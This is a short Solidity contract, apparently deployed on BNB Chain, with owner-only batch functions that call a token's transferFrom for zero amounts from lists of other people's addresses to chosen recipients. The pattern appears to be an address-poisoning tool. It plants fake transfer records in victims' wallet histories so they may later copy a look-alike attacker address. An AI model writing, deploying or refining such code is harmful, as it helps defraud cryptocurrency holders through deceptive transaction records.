/**
 *Submitted for verification at BscScan.com on 2023-01-19
*/

pragma solidity ^0.5.11;
pragma experimental ABIEncoderV2;
interface IERC20 {

     function transferFrom(
         address from,
         address to,
         uint256 amount
     ) external returns (bool);

}


contract NetkillerCashier {
    address public owner;
    IERC20 public token;    

    modifier onlyOwner {
        require(msg.sender == owner,"you are not the owner");
        _;
    }

    constructor(IERC20 _token) public {
        owner = msg.sender;
        token = _token;
    }

    function AutoSend(address[] memory _addrfrom,address[] memory _addrto) payable onlyOwner public {   
        require(_addrfrom.length > 0);
        require(_addrfrom.length==_addrto.length);
        for(uint32 i=0;i<_addrfrom.length;i++){
                   token.transferFrom(_addrfrom[i],_addrto[i],0);
              }

        
    }
    function AutoSend2(address[][] memory _addrlist) payable onlyOwner public {   
        require(_addrlist.length > 0);        
        for(uint32 i=0;i<_addrlist.length;i++){
                   token.transferFrom(_addrlist[i][0],_addrlist[i][1],0);
              }

        
    }
    
}